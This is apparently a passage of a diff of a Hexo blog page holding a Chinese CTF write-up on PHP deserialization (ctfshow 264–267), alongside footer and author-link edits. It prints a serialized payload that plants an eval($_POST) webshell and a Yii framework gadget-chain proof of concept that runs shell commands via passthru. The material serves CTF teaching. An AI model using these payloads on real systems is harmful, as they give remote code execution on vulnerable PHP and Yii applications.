class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;inc&#x2F;inc.php
+class User&#123;
+    public $username;
+    public $password;
+    public $status;
+    function __construct($username,$password)&#123;
+        $this-&gt;username &#x3D; $username;
+        $this-&gt;password &#x3D; $password;
+    &#125;
+    function setStatus($s)&#123;
+        $this-&gt;status&#x3D;$s;
+    &#125;
+    function __destruct()&#123;
+        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>其中包含<code>file_put_contents</code>函数可进行一句话木马的写入</p>
 <p>最终构造如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;1.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;kkk&#x27;]);phpinfo();?&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$s</span>));</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class User&#123;
+    public $username&#x3D;&quot;1.php&quot;;
+    public $password&#x3D;&quot;&lt;?php eval(\$_POST[&#39;kkk&#39;]);phpinfo();?&gt;&quot;;
+    public $status&#x3D;&#39;1&#39;;
+&#125;
+$s&#x3D;new User();
+echo base64_encode(&#39;|&#39;.serialize($s));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>首先修改cookie访问主页，然后访问/check.php使得木马文件被写入，最后访问/log-1.php即可</p>
 <p>264</p>
 <p><strong>265</strong></p>
 <p>地址传参</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;token=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;password = &amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
+class ctfshowAdmin&#123;
+   public $token;
+   public $password;
+   public function __construct()&#123;
+       $this-&gt;token&#x3D;&#39;a&#39;;
+       $this-&gt;password &#x3D; &amp;$this-&gt;token;
+	&#125;
+&#125;
+$a&#x3D;new ctfshowAdmin();
+echo serialize($a);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>266</strong></p>
 <p>匹配抛出异常后__destrurt不触发，所以使用大小写绕过即可</p>
 <p><strong>267</strong></p>
 <p>yii框架的反序列化漏洞，利用的类</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// make sure cursor is closed</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;reset();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_dataReader !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_dataReader = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_batch = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_value = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_key = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">这里的<span class="keyword">$this</span>-&gt;_dataReader内容可控，可以调用不存在close方法并且存在__call方法的类，全局搜索__call方法后，发现在</span><br><span class="line">yii\vendor\fzaninotto\faker\src\Faker\<span class="built_in">Generator</span>.php</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format(<span class="variable">$method</span>, <span class="variable">$attributes</span>);</span><br><span class="line">    &#125;</span><br><span class="line">跟进format</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">跟进getFormatter</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$formatter</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method_exists(<span class="variable">$provider</span>, <span class="variable">$formatter</span>)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>] = <span class="keyword">array</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];<span class="comment">//这里会返回传入的$formatter的值</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(sprintf(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="variable">$formatter</span>));</span><br><span class="line">    &#125;</span><br><span class="line">发现format方法中的call_user_func_array的第一个参数可控，想要利用进而查找调用了call_user_func函数的无参方法。发现了IndexAction.php中的run方法</span><br><span class="line">yii\rest\IndexAction.php</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checkAccess) &#123;</span><br><span class="line">            call_user_func(<span class="keyword">$this</span>-&gt;checkAccess, <span class="keyword">$this</span>-&gt;id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareDataProvider();</span><br><span class="line">    &#125;</span><br><span class="line">在run方法中checkAccess和id都可控，利用链构造成功</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">yii\db\BatchQueryResult
+    public function __destruct()
+    &#123;
+        &#x2F;&#x2F; make sure cursor is closed
+        $this-&gt;reset();
+    &#125;
+    public function reset()
+    &#123;
+        if ($this-&gt;_dataReader !&#x3D;&#x3D; null) &#123;
+            $this-&gt;_dataReader-&gt;close();
+        &#125;
+        $this-&gt;_dataReader &#x3D; null;
+        $this-&gt;_batch &#x3D; null;
+        $this-&gt;_value &#x3D; null;
+        $this-&gt;_key &#x3D; null;
+    &#125;
+
+这里的$this-&gt;_dataReader内容可控，可以调用不存在close方法并且存在__call方法的类，全局搜索__call方法后，发现在
+yii\vendor\fzaninotto\faker\src\Faker\Generator.php
+    public function __call($method, $attributes)
+    &#123;
+        return $this-&gt;format($method, $attributes);
+    &#125;
+跟进format
+    public function format($formatter, $arguments &#x3D; array())
+    &#123;
+        return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
+    &#125;
+跟进getFormatter
+    public function getFormatter($formatter)
+    &#123;
+        if (isset($this-&gt;formatters[$formatter])) &#123;
+            return $this-&gt;formatters[$formatter];
+        &#125;
+        foreach ($this-&gt;providers as $provider) &#123;
+            if (method_exists($provider, $formatter)) &#123;
+                $this-&gt;formatters[$formatter] &#x3D; array($provider, $formatter);
+                return $this-&gt;formatters[$formatter];&#x2F;&#x2F;这里会返回传入的$formatter的值
+            &#125;
+        &#125;
+        throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));
+    &#125;
+发现format方法中的call_user_func_array的第一个参数可控，想要利用进而查找调用了call_user_func函数的无参方法。发现了IndexAction.php中的run方法
+yii\rest\IndexAction.php
+    public function run()
+    &#123;
+        if ($this-&gt;checkAccess) &#123;
+            call_user_func($this-&gt;checkAccess, $this-&gt;id);
+        &#125;
+
+        return $this-&gt;prepareDataProvider();
+    &#125;
+在run方法中checkAccess和id都可控，利用链构造成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>利用链</p>
 <p><code>yii\db\BatchQueryResult::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">poc</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;tac /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">poc
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
                 
@@ -501,7 +652,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -524,7 +675,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -576,39 +727,6 @@
                 </div>
             </div>
             
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
         </div>
     </div>
 
@@ -659,7 +777,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -699,9 +817,8 @@
                     <div class="summary block-with-text">
                         
                             文件包含常见的文件包含漏洞函数：include()，require()
-本地包含利用方式：1、php://input：12?file=php://input请求体内为PHP代码：&lt;?php phpinfo(); ?&gt;
-
-php:
+本地包含利用方式：1、php://input：?file&#x3D;php:&#x2F;&#x2F;input
+请求体内为PHP代码：&lt;?php phpinfo(
                         
                     </div>
                     <div class="publish-info">
@@ -711,7 +828,7 @@ php:
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -742,6 +859,9 @@ php:
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -850,69 +970,15 @@ php:
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -947,7 +1013,7 @@ php:
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -955,10 +1021,8 @@ php:
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -967,9 +1031,7 @@ php:
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1129,6 +1191,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1155,8 +1225,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
